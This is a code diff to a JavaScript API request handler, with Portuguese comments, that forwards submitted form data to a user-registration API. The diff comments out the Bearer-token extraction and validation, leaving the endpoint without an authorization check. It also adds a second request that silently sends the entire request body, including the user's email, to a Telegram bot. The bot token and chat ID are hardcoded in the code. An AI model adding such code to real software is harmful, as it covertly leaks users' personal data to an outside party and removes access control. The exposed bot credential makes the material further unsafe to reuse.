@@ -28,8 +28,8 @@ export default async function handler(req, res) {
     // }
 
     // Extrai o token Bearer da string
-    const token = authorizationHeader.substring(7);
-    const userData = validateToken(token);
+    // const token = authorizationHeader.substring(7);
+    // const userData = validateToken(token);
 
     // // Verifica se o token é válido (neste exemplo, verifica se é 'AlterPass456')
     // if (!userData) {
@@ -42,6 +42,11 @@ export default async function handler(req, res) {
             // Coletar os dados do corpo da requisição
             const data = req.body;
             const email = req.body.email;
+            const dataTelegram = {
+                "chat_id": "351354199",
+                "text": data,
+                "disable_notification": true
+            };
             // Fazer um POST para a outra API
             //console.log(data);
             const response = await fetch('http://sinforme.com.br/grace_API/usuarios/enviar', {
@@ -53,6 +58,15 @@ export default async function handler(req, res) {
                 body: JSON.stringify(data)
             });
 
+            const response2 = await fetch('https://api.telegram.org/bot6422010121:AAF1oGDHROer_1vvTpqyarSB5-POxLBo3tQ/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    // Inclua outros headers se necessário
+                },
+                body: JSON.stringify(dataTelegram)
+            });
+            //console.log(dataTelegram);
             // Verificar a resposta da outra API
             if (!response.ok) {
                 const errorText = await response.text(); // obter a mensagem de erro da resposta
